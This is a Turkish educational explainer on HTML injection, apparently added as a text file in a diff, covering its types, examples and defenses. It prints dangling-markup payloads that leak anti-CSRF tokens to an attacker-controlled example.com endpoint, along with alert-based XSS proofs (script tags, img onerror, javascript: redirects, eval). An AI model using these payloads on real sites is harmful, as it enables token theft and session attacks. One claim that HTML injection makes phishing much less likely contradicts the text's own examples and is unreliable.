@@ -1,0 +1,63 @@
+HTML enjeksiyonu nedir?
+    HTML enjeksiyonu, bir saldırganın bir web uygulamasının meşru HTML koduna kötü amaçlı HTML içeriği enjekte etmesine olanak tanıyan bir web güvenlik açığıdır. HTML enjeksiyonları, siteler arası komut dosyası çalıştırma (XSS) ile çok benzerdir ; iletim şekli tamamen aynıdır, ancak enjekte edilen içerik bir komut dosyası değil, saf HTML etiketleridir. HTML enjeksiyonları XSS'den daha az tehlikelidir, ancak yine de kötü amaçlı olarak kullanılabilir.
+
+HTML enjeksiyonu nasıl çalışır?
+    Tıpkı siteler arası komut dosyası çalıştırma (XSS) saldırılarında olduğu gibi, HTML enjeksiyonu da kötü niyetli bir kullanıcının güvenilmeyen girdi olarak bir yük (çoğunlukla HTML kodu, nadiren CSS) sağlaması ve web tarayıcısının bunu savunmasız web sayfasının hiper metin işaretleme dilinin bir parçası olarak yürütmesiyle gerçekleşir. HTML enjeksiyon saldırıları yalnızca istemciyi hedef alır ve tıpkı XSS ​​saldırıları gibi sunucuyu değil, kullanıcıyı etkiler.
+    Web güvenliğinde, HTML enjeksiyonunun iki ana türü vardır: yansıtmalı ve depolanmış , bunlar yansıtmalı XSS ​​ve depolanmış XSS'ye benzer :
+        Reflected HTML enjeksiyonunda, zararlı yazılım her kullanıcıya ayrı ayrı (genellikle kötü amaçlı bir bağlantı olarak) iletilmeli ve isteğin bir parçası haline gelmelidir.
+        Stroed HTML enjeksiyonunda, zararlı yazılım web sunucusu tarafından saklanır ve daha sonra potansiyel olarak birden fazla kullanıcıya iletilir.
+    HTML enjeksiyonları ile XSS güvenlik açıkları arasındaki temel fark, saldırganın yeteneklerinin kapsamıdır. HTML içeriğinin bildirimsel işlevselliği nedeniyle, zararlı yazılım JavaScript koduna kıyasla çok daha az şey başarabilir. Bu da HTML enjeksiyonlarının kimlik avı saldırılarında kullanılma olasılığını önemli ölçüde azaltır.
+
+HTML enjeksiyon saldırılarının türleri
+    Stored HTML injection:
+        Saklı HTML enjeksiyonunda, kötü amaçlı bir HTML kodu web uygulamasına enjekte edilir ve sunucuda (veritabanında) kalıcı olarak saklanır. Enjekte edilen kod daha sonra etkilenen sayfaya erişen tüm kullanıcılara gösterilir.
+        HTML enjeksiyonu , sayfaları değiştirmek, kimlik avı formları eklemek veya XSS saldırılarıyla birlikte kötü amaçlı komut dosyaları çalıştırmak da dahil olmak üzere çeşitli kötü amaçlı eylemlerde kullanılabilir.
+    Reflected HTML injection:
+        Yansıtılmış HTML enjeksiyonu gerçekleştiğinde, kötü amaçlı HTML, sunucuda depolanmak yerine sunucunun yanıtında kullanıcıya geri yansıtılır. Bu genellikle değiştirilmiş form girişleri veya URL parametreleri aracılığıyla olur.
+        Yansıtılmış HTML enjeksiyonu, genellikle web sitelerini değiştirmek, kimlik avı faaliyetlerinde veya daha gelişmiş saldırılar için XSS güvenlik açıklarıyla birlikte kullanılır.
+    DOM-based HTML injection:
+        DOM tabanlı HTML enjeksiyonu olaylarında, güvenlik açığı tamamen istemci tarafında, genellikle DOM'u dinamik olarak güncelleyen JavaScript'te bulunur. Kötü niyetli kişi, enjekte edilen HTML'i içerecek şekilde DOM'u manipüle ederek bu güvenlik açığından yararlanır.
+        DOM tabanlı HTML enjeksiyonu, saldırganların sayfa içeriğini dinamik olarak değiştirmesine olanak tanıyabileceği gibi, komut dosyaları enjekte edilirse daha ciddi saldırılara da yol açabilir.
+HTML enjeksiyon saldırılarına örnekler:
+    Hassas kullanıcı verilerinin sızdırılması
+    Tarayıcıda saklanan şifrelerin sızdırılması
+
+CSRF karşıtı belirteçlerin sızdırılması
+    Saldırganlar ayrıca, daha sonraki bir siteler arası istek sahteciliği (CSRF) saldırısı için anti-CSRF belirteçlerini sızdırmak amacıyla HTML enjeksiyonunu da kullanabilirler . Anti-CSRF belirteçleri genellikle bir formdaki gizli giriş türü kullanılarak iletilir .
+    Token'ı ele geçirmek için, bir saldırgan örneğin, tek tırnaklı <img> etiketi kullanabilir. Bu durumda, kapanış tek tırnağının olmaması, başka bir tek tırnak bulunana kadar içeriğin geri kalanının URL'nin bir parçası olarak değerlendirilmesine neden olur. Geçerli kod çift tırnak kullanıyorsa, gizli girdi saldırgan tarafından kontrol edilen record.php<img src='http://example.com/record.php? betiğine gönderilir ve kaydedilir:
+    <img src='http://example.com/record.php?<input type="hidden" name="anti_xsrf" value="eW91J3JlIGN1cmlvdXMsIGFyZW4ndCB5b3U/">
+    Bir diğer seçenek ise <textarea> etiketi eklemektir . Bu durumda, <textarea> etiketinden sonraki tüm içerik gönderilecek ve hem <textarea> hem de <form> etiketleri örtük olarak kapatılacaktır. Ancak bu saldırının işe yaraması için kullanıcının formu manuel olarak göndermesi sağlanmalıdır:
+    <form action='http://example.com/record.php?'<textarea><input type="hidden" name="anti_xsrf" value="eW91J3JlIGN1cmlvdXMsIGFyZW4ndCB5b3U/">
+
+HTML enjeksiyon güvenlik açıklarından nasıl korunulur?:
+    Çoğu enjeksiyon türünde olduğu gibi, HTML enjeksiyonlarını önlemek de girdi doğrulaması gerektirir. HTML enjeksiyonlarını önlerken, siteler arası komut dosyası çalıştırmayı ( XSS) önlerken kullandığınız aynı prensipleri ve yöntemleri izlemelisiniz . Tıpkı XSS'de olduğu gibi, girdiden herhangi bir HTML içeriğini filtrelemeyi deneyebilirsiniz (ancak filtrelerden kaçınmak için birçok hile kullanılabileceğini unutmayın ) veya tüm HTML etiketlerini kaçış karakterleriyle değiştirebilirsiniz.
+    İkinci yaklaşım çok daha etkili olsa da, tasarım gereği kullanıcı girdisinde bazı HTML kodlarına izin veriliyorsa (örneğin, kod parçacıkları sağlamak için) uygulanması zor olabilir. Bu gibi durumlarda, beyaz listelere dayalı sıkı girdi filtrelemesi önerilir.
+
+HTML enjeksiyon saldırılarını nasıl önleyebiliriz?:
+    Bir düzeltme yapılana kadar HTML enjeksiyon güvenlik açıklarını geçici olarak azaltmak için WAF (web uygulama güvenlik duvarı) kurallarını kullanabilirsiniz . Bu kurallar sayesinde kullanıcılar web uygulamanıza kötü amaçlı girdi sağlayamayacak, dolayısıyla tarayıcılarında kötü amaçlı HTML çalıştırılamayacaktır. Ancak, web uygulama güvenlik duvarları uygulamanızın bağlamını anlamadığından, bu kurallar saldırganlar tarafından atlatılabilir ve asla kalıcı bir çözüm olarak değerlendirilmemelidir.
+    <base> etiketi HTML enjeksiyonu gibi bazı HTML enjeksiyon saldırıları , web sunucunuzda uygun bir İçerik Güvenlik Politikası (CSP) kullanılarak da engellenebilir, ancak bu yalnızca birkaç durumu kapsar. Bu nedenle, birçok XSS türüne karşı korunmak için CSP başlıklarına güvenebilirsiniz, ancak HTML enjeksiyonuna karşı korunmak için bunlara güvenmemelisiniz.
+
+HTML İnjection Nasıl Anlaşılır:Örnek 1: URL Parametrelerinin İşlenmesi
+    Güvenlik Açığı Kurulumu: Bir web sayfası, uygun bir şekilde temizleme işlemi yapılmadan doğrudan HTML'ye bir URL parametresi eklemek için JavaScript kullanıyor. Örneğin, userInput parametresi doğrudan DOM'a dahil ediliyor
+    Kullanıcı Etkileşimi: http://example.com/page.html?userInput=<script>alert('Injected!'); </script>
+    Sonuç: Komut dosyası etiketi HTML'nin bir parçası olarak yürütülür ve 'Enjekte edildi!' mesajıyla bir uyarı kutusu açılır. Bu, JavaScript kodunun DOM'a nasıl enjekte edilebileceğini göstermektedir.
+    
+    Örnek 2: InnerHTML Güvenlik Açığı
+    Güvenlik Açığı Kurulumu: Bir web sayfasındaki JavaScript fonksiyonu, kullanıcı tarafından sağlanan içeriği DOM'a eklemek için innerHTML kullanıyor.
+    <img src=x onerror=alert('Injected!')> Kullanıcı, form alanına bir metin dizesi girer .
+    Sonuç: Giriş, innerHTML kullanılarak sayfada oluşturulduğunda, tarayıcı resmi yüklemeye çalışır, başarısız olur ve onerror JavaScript kodunu çalıştırarak 'Enjekte Edildi!' uyarısını gösterir.
+    
+    Örnek 3: JavaScript Tabanlı Yönlendirme
+    Güvenlik Açığı Kurulumu: Bir web sayfası, uygun doğrulama yapılmadan URL parametresine dayalı yönlendirmeyi işlemek için JavaScript kullanıyor. Örneğin, window.location, URL parametresi yönlendirmesine göre ayarlanıyor.
+    Kullanıcı Etkileşimi: Örneğin, özel olarak hazırlanmış bir URL http://example.com/page.html?redirect=javascript:alert('Injected!')
+    Sonuç: Yönlendirme parametresindeki JavaScript kodu çalıştırılır ve 'Enjekte Edildi!' uyarısı görüntülenir. Bu, kullanıcıyı kötü amaçlı bir siteye yönlendirmek veya zararlı komut dosyalarını çalıştırmak için kullanılabilir.
+    
+    Örnek 4: Güvenli Olmayan JavaScript Değerlendirmesi
+    Güvenlik Açığı Kurulumu: Bir web sayfası, URL parametresi gibi kullanıcı tarafından kontrol edilen bir girdiden gelen kodu değerlendiren bir JavaScript eval() fonksiyonu içerir.
+    Kullanıcı Etkileşimi: Kullanıcı şu URL'ye gider: http://example.com/page.html?code=alert('Injected!')
+    Sonuç: eval() fonksiyonu, code parametresinden gelen kodu çalıştırır ve 'Enjekte Edildi!' uyarısı görüntülenir.
+
+
+Kaynakça:
+    https://www.invicti.com/learn/html-injection
+    https://www.imperva.com/learn/application-security/html-injection/
